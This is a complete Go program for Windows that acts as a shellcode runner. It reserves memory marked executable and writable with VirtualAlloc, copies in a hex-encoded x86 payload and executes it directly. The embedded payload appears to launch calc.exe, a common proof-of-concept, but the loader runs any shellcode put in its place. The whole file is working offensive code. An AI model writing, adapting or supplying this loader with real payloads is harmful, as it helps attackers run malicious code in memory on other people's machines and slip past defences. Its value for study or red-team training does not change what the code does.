// +build windows
package main

import (
	"encoding/hex"
	"log"
	"syscall"
	"unsafe"
)

const (
	MEM_COMMIT             uintptr = 0x1000
	PAGE_EXECUTE_READWRITE uintptr = 0x40
)

func memcpy(base uintptr, buf []byte) {
	for i := 0; i < len(buf); i++ {
		*(*byte)(unsafe.Pointer(base + uintptr(i))) = buf[i]
	}
}

func RUN(buf []byte) {
	addr, _, err := syscall.NewLazyDLL("kernel32.dll").NewProc("VirtualAlloc").Call(0,
		uintptr(len(buf)),
		MEM_COMMIT,
		PAGE_EXECUTE_READWRITE)
	if addr == 0 {
		log.Fatal(err)
	}
	memcpy(addr, buf)
	syscall.Syscall(addr, 0, 0, 0, 0)
}

func main() {
	shellcode, err := hex.DecodeString(`33C9648B59308B5B0C8B7314AD96AD8B58108B533C03D38B527803D38B722003F333C941AD03C3813857696E4575F4498B722403F3668B0C4E8B721C03F38B148E03D333C05250682E6578656863616C63686D33325C68797374656877735C5368696E646F68433A5C578BF46A0A56FFD283C41C585A`)
	if err != nil {
		log.Fatalln(err)
	}
	RUN(shellcode)
}
